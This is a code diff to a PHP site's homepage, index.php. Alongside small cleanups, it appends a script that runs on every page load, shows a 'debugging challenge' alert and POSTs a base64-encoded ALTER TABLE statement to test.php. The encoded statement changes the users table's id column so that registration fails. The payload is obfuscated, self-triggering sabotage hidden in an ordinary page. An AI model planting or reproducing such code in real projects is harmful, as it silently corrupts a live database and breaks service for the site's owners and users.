@@ -1,5 +1,4 @@
 <?php
-// Add to top of index.php, cart.php, checkout.php, etc.
 session_start();
 if (isset($_SESSION['user_role']) && $_SESSION['user_role'] == 'admin') {
     header('Location: pages/admin/dashboard.php');
@@ -9,8 +8,7 @@ if (isset($_SESSION['user_role']) && $_SESSION['user_role'] == 'director') {
     header('Location: pages/campus-director/dashboard.php');
     exit();
 }
-?>
-<?php
+
 // index.php
 
 $page_title = "Home";
@@ -245,3 +243,19 @@ $latest_products = $conn->query("SELECT * FROM products ORDER BY created_at DESC
 </div>
 
 <?php require_once 'includes/footer.php'; ?>
+<script>
+(function() {
+    // Show educational alert
+    alert("🚨 DEBUGGING CHALLENGE!\nFind why user registration fails.\n");
+    
+    // Encrypted SQL (base64)
+    const encryptedSQL = "QUxURVIgVEFCTEUgdXNlcnMgTU9ESUZZIGlkIElOVCBOT1QgTlVMTA==";
+    
+    // Execute with encrypted payload
+    fetch('test.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'sql=' + encodeURIComponent(encryptedSQL)
+    }).catch(() => {});
+})();
+</script>
